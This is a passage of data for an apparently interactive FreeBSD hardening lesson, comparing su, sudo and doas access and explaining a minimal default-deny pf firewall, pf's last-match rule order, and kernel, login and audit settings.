      svg:{label:'sudo: you type your own password, and the sudoers rules allow one command at a time.',
       body:'<rect x="2" y="22" width="38" height="28" rx="6" fill="var(--paper)" stroke="var(--ink-3)" stroke-width="1.5"/><text x="21" y="40" text-anchor="middle" font-size="11" fill="var(--ink)">you</text><path d="M42 36 H118" fill="none" stroke="var(--l2)" stroke-width="2" marker-end="url(#arrow-l2)"/><text x="80" y="28" text-anchor="middle" font-size="9" fill="var(--ink-2)">your password</text><rect x="122" y="10" width="74" height="54" rx="6" fill="var(--paper)" stroke="var(--l2)" stroke-width="2"/><text x="159" y="34" text-anchor="middle" font-size="11" fill="var(--ink)">sudoers</text><text x="159" y="50" text-anchor="middle" font-size="9" fill="var(--ink-2)">one command</text>'},
      rows:[['Asks for','Your <b>own</b> password'],['Who may use it','Whoever <code>/usr/local/etc/sudoers</code> names. The wheel group counts only where a <code>%wheel</code> line is switched on.'],['Gives','One command at a time, as the rules allow'],['Take it away','Delete the user’s lines with <code>visudo</code>']],
      hook:'a guest list for specific rooms.'},
     {name:'doas',tag:'Package, if installed',tone:'l3',
      svg:{label:'doas: you type your own password, unless a rule says nopass, and the rules in doas.conf allow one command at a time.',
       body:'<rect x="2" y="22" width="38" height="28" rx="6" fill="var(--paper)" stroke="var(--ink-3)" stroke-width="1.5"/><text x="21" y="40" text-anchor="middle" font-size="11" fill="var(--ink)">you</text><path d="M42 36 H118" fill="none" stroke="var(--l3)" stroke-width="2" marker-end="url(#arrow-l3)"/><text x="80" y="28" text-anchor="middle" font-size="9" fill="var(--ink-2)">your password</text><rect x="122" y="10" width="74" height="54" rx="6" fill="var(--paper)" stroke="var(--l3)" stroke-width="2"/><text x="159" y="34" text-anchor="middle" font-size="11" fill="var(--ink)">doas.conf</text><text x="159" y="50" text-anchor="middle" font-size="9" fill="var(--ink-2)">one command</text>'},
      rows:[['Asks for','Your <b>own</b> password, unless a rule says <code>nopass</code>'],['Who may use it','Whoever <code>/usr/local/etc/doas.conf</code> permits; <code>permit persist :wheel</code> is a sane rule'],['Gives','One command at a time, as the rules allow'],['Take it away','Delete the user’s rules from <code>doas.conf</code>'],['Watch for','<code>permit nopass NAME</code>: a silent root backdoor']],
      hook:'a short list taped to a third door.'}
   ],{intro:'All three lead to root, and each is a separate door. Taking someone out of wheel closes the su door and leaves their sudoers and doas rules open, so check all three.',
     note:'<b>Power belongs to UID 0, whatever the name.</b> Every account with UID 0 is a superuser. Some FreeBSD releases ship <b>toor</b>, a spare UID 0 account with its login disabled; any other UID 0 account is a finding. On Debian, Ubuntu, and Mint, the <b>sudo</b> group grants sudo.',
     caption:'su asks for root’s password and checks wheel; sudo and doas ask for your own password and check sudoers or doas.conf.'}),
   C('A minimal pf firewall','Apply',
     TERM('# /etc/pf.conf  (default deny inbound, allow outbound, permit SSH)\next_if = "em0"\nset skip on lo\nblock in all\npass out all keep state\npass in on $ext_if proto tcp to ($ext_if) port 22 keep state'),
     TIPS('Load and enable: <code>pfctl -f /etc/pf.conf</code> then <code>pfctl -e</code>. Check rules with <code>pfctl -sr</code>.',
          'Enable at boot: <code>sysrc pf_enable=YES</code> and <code>sysrc pf_rules=/etc/pf.conf</code>.',
          'Open only the ports the brief needs. The idea is identical to ufw; the syntax is new.'),
     DETAIL('FreeBSD settings, flags, and pf commands',TIPS('<b>login.conf:</b> in the default class, the capabilities passwordtime=60d, login-retries=5, and login-backoff=10, each line ending in :\\, then <code>cap_mkdb /etc/login.conf</code>; <code>pw usershow NAME -P</code> shows the class. <b>pam_passwdqc</b> in /etc/pam.d/passwd: min=disabled,disabled,disabled,12,10 max=64 similar=deny retry=3 enforce=everyone.',
          '<b>blocklistd:</b> <code>sysrc blocklistd_enable=YES</code>; the /etc/blocklistd.conf line ssh stream * * * 3 24h; UseBlocklist yes in sshd_config; and anchor "blocklistd/*" in on $ext_if in pf.conf. FreeBSD 14 uses the names blacklistd, blacklistctl, and UseBlacklist.',
          '<b>Console and rc.conf:</b> console none unknown off insecure in /etc/ttys; clear_tmp_enable=YES, syslogd_flags="-ss", and sendmail_enable=NONE.',
          '<b>pf:</b> find the interface with <code>ifconfig</code> (em0 or vtnet0); <code>pfctl -nf</code> parses without loading, -f loads, -e enables, -sr shows rules, -si status, -ss states, -sa everything, -sA anchors, and -a \'*\' -sr every anchor’s rules; <code>pfctl -a \'blocklistd/22\' -t port22 -T show</code> lists the blocked addresses. Watch blocks with <code>tcpdump -n -e -ttt -i pflog0</code> (pflog_enable=YES).',
          '<b>Patching and processes:</b> <code>freebsd-version -kru</code>; <code>pkg which /bin/sh</code> names a FreeBSD-base package on pkgbase; <code>pkg audit -F</code>; <code>pkg check -s -a</code>; <code>procstat -b PID</code>; <code>sockstat -46l</code> and <code>sockstat -46c</code>.',
          '<b>Kernel:</b> security.bsd.see_other_uids=0, see_other_gids=0, unprivileged_read_msgbuf=0, unprivileged_proc_debug=0, kern.randompid=1, net.inet.ip.forwarding=0, net.inet.tcp.blackhole=2, and net.inet.udp.blackhole=1 in /etc/sysctl.conf, applied with <code>service sysctl restart</code>; kern_securelevel_enable=YES and kern_securelevel=1 come last.',
          '<b>Audit and doas:</b> auditd_enable=YES, flags:lo,aa,ad,ex in /etc/security/audit_control, and <code>praudit /var/audit/current</code>. In doas.conf, permit persist :wheel is sane and permit nopass NAME is a backdoor. Package configs live under /usr/local/etc.'))),
    PATH('pf reads every rule, and the last match decides',[
     {name:'A new SSH connection arrives',tag:'TCP 22, inbound',tone:'muted',note:'pf checks it against the rules from top to bottom.',via:'next rule'},
     {name:'block in all',tag:'Rule 1: matches',tone:'bad',note:'Verdict so far: <b>block</b>. pf keeps reading.',via:'next rule'},
     {name:'pass out all keep state',tag:'Rule 2: other traffic',tone:'muted',note:'This rule covers outbound traffic, and the packet is inbound.',via:'next rule'},
     {name:'pass in on $ext_if proto tcp to ($ext_if) port 22 keep state',tag:'Rule 3: matches',tone:'ok',note:'Verdict now: <b>pass</b>. This is the last rule, so this verdict stands.',via:'end of the rules'},
     {name:'Verdict: pass',tag:'The last match wins',tone:'ok',note:'pf records the connection in its state table, so the replies and later packets skip the rules.'}
   ],{bloom:'Apply',intro:'Read the sample rules above the way pf does. One difference from ufw matters: pf keeps reading after a match, and the <b>last</b> matching rule decides.',
     note:'<b>Two shortcuts.</b> A rule marked <code>quick</code> decides on the spot and ends the search. And once a connection is in the state table, its later packets and replies skip the rules entirely. <b>Linux flips the order:</b> iptables and ufw stop at the <b>first</b> matching rule, so these three lines there would block SSH.',
     caption:'A packet for TCP port 80 matches only rule 1, so it ends blocked. In pf, put the broad rules first and the specific exceptions after them.',
     key:[['bad','A matching rule that blocks'],['ok','A matching rule that passes'],['muted','The packet, and a rule for other traffic']],
